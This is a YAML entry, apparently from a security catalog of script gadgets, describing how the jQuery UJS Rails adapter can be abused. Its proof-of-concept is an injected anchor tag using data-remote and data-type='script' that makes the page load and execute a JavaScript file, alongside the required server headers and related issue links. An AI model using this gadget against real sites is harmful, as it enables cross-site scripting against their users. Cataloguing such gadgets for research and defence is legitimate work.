---
description: Ruby on Rails unobtrusive scripting adapter for jQuery.
github: rails/jquery-ujs
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - a-tag
      - data-attr
      - href-attr
      - any-timing
    pocs:
      - description: |
          jQuery UJS allows loading JavaScript files using the `data-type="script"` attribute. For this to works the server must respond with `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Headers: *` and `Content-Type: application/javascript`. Since the event is delegated to the document, it can be triggered at any time.
        code: |
          <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ujs/1.2.3/rails.min.js"></script>

          <!-- user input -->
          <a data-remote="true" data-method="get" data-type="script" href="[current-location]/assets/xss/index.js">XSS</a>
    links:
      - https://github.com/rails/rails/issues/42164
      - https://gitlab.com/gitlab-org/gitlab/-/issues/213273
      - https://gitlab.com/gitlab-org/gitlab/-/issues/336138
      - https://blog.ryotak.net/post/dom-based-race-condition/
    more-info: |
      The full list of available `data-*` attributes is:
      - data-confirm
      - data-method
      - data-remote
      - data-disable
      - data-disable-with
      - data-url
      - data-params
      - data-with-credentials
      - data-type
      - data-turbo
      - data-disabled
---
